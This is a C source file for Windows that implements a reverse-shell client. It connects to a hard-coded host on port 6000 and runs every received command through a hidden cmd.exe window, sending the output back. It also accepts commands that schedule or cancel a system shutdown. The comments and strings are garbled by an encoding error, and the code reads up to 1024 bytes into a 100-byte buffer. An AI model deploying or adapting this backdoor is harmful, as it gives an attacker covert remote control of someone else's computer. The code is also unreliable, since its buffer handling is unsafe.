#include"pch.h"
#include <Winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#pragma warning(suppress : 4996)
#pragma warning(disable : 4996)
#define MSG_LEN 1024

/**
 * ִ�� CMD ����
 */
int cmd(char *cmdStr, char *message)
{
	DWORD readByte = 0;
	char command[1024] = { 0 };
	char buf[MSG_LEN] = { 0 };    //������

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // ����������Ϣ
	PROCESS_INFORMATION pi; // ������Ϣ
	SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����

	// ƴ�� cmd ����
	sprintf(command, "cmd.exe /c %s", cmdStr);
	// printf("-- CMD ����: [%s]n", command);

	// ���ùܵ���ȫ����
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE; // �ܵ�����ǿɱ��̳е�
	sa.lpSecurityDescriptor = NULL;

	// ���������ܵ����ܵ�����ǿɱ��̳е�
	if (!CreatePipe(&hRead, &hWrite, &sa, 1024))
	{
		printf("�ܵ�����ʧ��! Error: %xn", (unsigned int)GetLastError());
		return 1;
	}

	// ���� cmd ������Ϣ
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si); // ��ȡ���ݴ�С
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
	si.wShowWindow = SW_HIDE;               // ���ش�������
	si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ

	// �����ӽ���,��������,�ӽ����ǿɼ̳е�
	if (!CreateProcess(
		NULL,       // ��������·��, ʹ��������
		command,    // ����������
		NULL,       // ���̳н��̾��(Ĭ��)
		NULL,       // ���̳��߳̾��(Ĭ��)
		TRUE,       // �̳о��
		0,          // û�д�����־(Ĭ��)
		NULL,       // ʹ��Ĭ�ϻ�������
		NULL,       // ʹ�ø����̵�Ŀ¼
		&si,        // STARTUPINFO �ṹ�洢������Ϣ
		&pi))     // PROCESS_INFORMATION ����������Ľ��������Ϣ
	{
		printf("��������ʧ��! Error: %xn", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}

	CloseHandle(hWrite);

	/*
		�ܵ��� write �˾���ѱ� cmd ��������ʹ������̳�,
		�� cmd ���ʱ�������д��ܵ���
		����ͨ����ȡ�ܵ��� read �ˣ��Ϳ��Ի�� cmd �����
	*/
	while (ReadFile(hRead, buf, MSG_LEN, &readByte, NULL))
	{
		strcat(message, buf);
		ZeroMemory(buf, MSG_LEN);
	}

	//printf("-- [CMD] Message: [%s] Length:%d n", message, strlen(message) + 1);

	CloseHandle(hRead);
	return 0;
}

/**
 * ��������
 */
int run(char *recvCmd, char *message)
{
	if (strcmp(recvCmd, "test") == 0)
	{
		strcpy(message, "�������ã���ʲô����~");
	}
	else if (strcmp(recvCmd, "shutdown") == 0)
	{
		// ִ�йػ�������˸���ʱ�ػ�ûֱ�ӹ�
		system("shutdown -s -t 1800");
		strcpy(message, "�ͻ��˽��� 30 ���Ӻ�ر�");
	}
	else if (strcmp(recvCmd, "cancel") == 0)
	{
		// ע���ػ�����
		system("shutdown -a");
		strcpy(message, "�ͻ��˶�ʱ�ػ���ȡ��");
	}
	else if (strcmp(recvCmd, "exit") == 0)
	{
		return 1;
	}
	else
	{
		// ���� cmd
		cmd(recvCmd, message);
	}

	return 0;
}

void main()
{
	int err = 0;
	char message[MSG_LEN] = { 0 };
	char recvCmd[100] = { 0 };

	SOCKET sockClient; // �ͻ��� Scoket
	SOCKADDR_IN addrServer; // ����˵�ַ

	WSADATA wsaData;
	WORD wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	err = WSAStartup(wVersionRequested, &wsaData);

	if (err != 0)
	{
		return;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
	{
		// �������󣬳������
		WSACleanup();
		return;
	}

	// �½��ͻ��� scoket
	sockClient = socket(AF_INET, SOCK_STREAM, 0);

	// ����Ҫ���ӵķ���˵�ַ
	addrServer.sin_addr.S_un.S_addr = inet_addr("192.168.1.106"); // ����� IP
	addrServer.sin_family = AF_INET;                           // Э��������INET
	addrServer.sin_port = htons(6000);                         // ���Ӷ˿�1234

	// �� sockClient ���ӵ� �����
	connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	while (1)
	{
		// ����ַ���
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message, sizeof(message));

		// �ӷ���˻�ȡ����
		recv(sockClient, recvCmd, MSG_LEN, 0);

		// �������ݵ������
		if (strlen(recvCmd) > 0)
		{
			printf("-- �յ�����: [%s]n", recvCmd);

			if (run(recvCmd, message))
			{
				break;
			}

			// printf("Message: [%s] Length:%d n", message, strlen(message) + 1);
			send(sockClient, message, strlen(message) + 1, 0);
		}
	}

	// �ر�socket
	closesocket(sockClient);
	WSACleanup();
}